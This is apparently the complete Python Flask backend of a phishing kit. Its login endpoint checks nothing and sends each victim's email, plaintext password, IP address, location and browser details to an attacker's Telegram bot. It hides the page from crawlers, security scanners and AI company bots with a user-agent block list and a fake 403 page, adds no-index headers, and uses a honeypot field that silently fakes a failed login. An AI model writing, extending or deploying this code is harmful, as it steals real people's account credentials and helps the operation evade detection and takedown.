from flask import Flask, render_template, request, jsonify, session, make_response
import os
import re
import requests
import threading
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

def get_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or 'unknown'


def get_location(ip):
    if ip in ('unknown', '127.0.0.1', '::1', None):
        return 'Localhost'
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                parts = [data.get('city'), data.get('regionName'), data.get('country')]
                return ', '.join([p for p in parts if p]) or 'Unknown'
    except Exception:
        pass
    return 'Unknown'


def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass


def notify_login(email,password):
    ip = get_ip()
    location = get_location(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    message = (
        f'<b>🔐 New Login</b>\n'
        f'<b>Username:</b> <code>{email}</code>\n'
        f'<b>Password:</b> <code>{password}</code>\n'
        f'<b>IP:</b> <code>{ip}</code>\n'
        f'<b>Location:</b> {location}\n'
        f'<b>Time:</b> {timestamp}\n'
        f'<b>User-Agent:</b> {user_agent}'
    )
    threading.Thread(target=send_telegram_message, args=(message,), daemon=True).start()


# Common search-engine/crawler/scraper user-agent markers to block.
BOT_UA_PATTERN = re.compile(
    r'(bot|crawl|spider|scrape|scrapy|curl|wget|python-requests|httpx|'
    r'java/|okhttp|headless|phantom|selenium|puppeteer|playwright|'
    r'googlebot|bingbot|duckduckbot|baiduspider|yandex|slurp|facebookexternalhit|'
    r'twitterbot|whatsapp|linkedinbot|ahrefs|semrush|mj12|petalbot|bytespider|'
    r'ccbot|amazonbot|gptbot|claudebot|anthropic|openai|facebookbot)',
    re.IGNORECASE
)

@app.after_request
def add_noindex_headers(response):
    """Prevent search engines and scraper indexes from caching/indexing the page."""
    response.headers['X-Robots-Tag'] = 'noindex, nofollow, noarchive, noimageindex'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response


def is_bot():
    """Heuristic detection of bots/headless scrapers from the request."""
    ua = request.headers.get('User-Agent', '')
    return bool(BOT_UA_PATTERN.search(ua))


def honeypot_hit():
    """Returns True if the (hidden) honeypot field was filled in."""
    data = request.get_json(silent=True) or {}
    trap = data.get('bot_trap') or data.get('botTrap')
    return isinstance(trap, str) and trap.strip() != ''


@app.route('/')
def index():
    if is_bot():
        # Bots get a shell page with no document content.
        return make_response(
            '<!DOCTYPE html><html><head><meta name="robots" content="noindex, nofollow">'
            '<title>403</title></head><body>'
            '<h3 style="font-family:sans-serif">403 Forbidden — direct page access is restricted.</h3>'
            '</body></html>',
            403
        )
    return render_template('index.html')


@app.route('/api/login', methods=['POST'])
def login():
    if is_bot():
        return jsonify({'success': False, 'message': 'Automated access is not permitted.'}), 403
    if honeypot_hit():
        # Silently treat as a failed login; don't leak that we detected them.
        return jsonify({'success': False, 'message': 'Incorrect email or password. Please try again.'}), 401

    data = request.get_json(silent=True) or {}
    email = (data.get('email') or '').strip()
    password = data.get('password') or ''

    # No credential verification — forward the captured username/password to Telegram.
    notify_login(email, password)
    session['authenticated'] = False
    session['email'] = email
    return jsonify({'success': True, 'email': email})


@app.route('/api/verify')
def verify():
    if is_bot():
        return jsonify({'authenticated': False}), 403
    if session.get('authenticated'):
        return jsonify({'authenticated': True, 'email': session.get('email')})
    return jsonify({'authenticated': False}), 401




if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

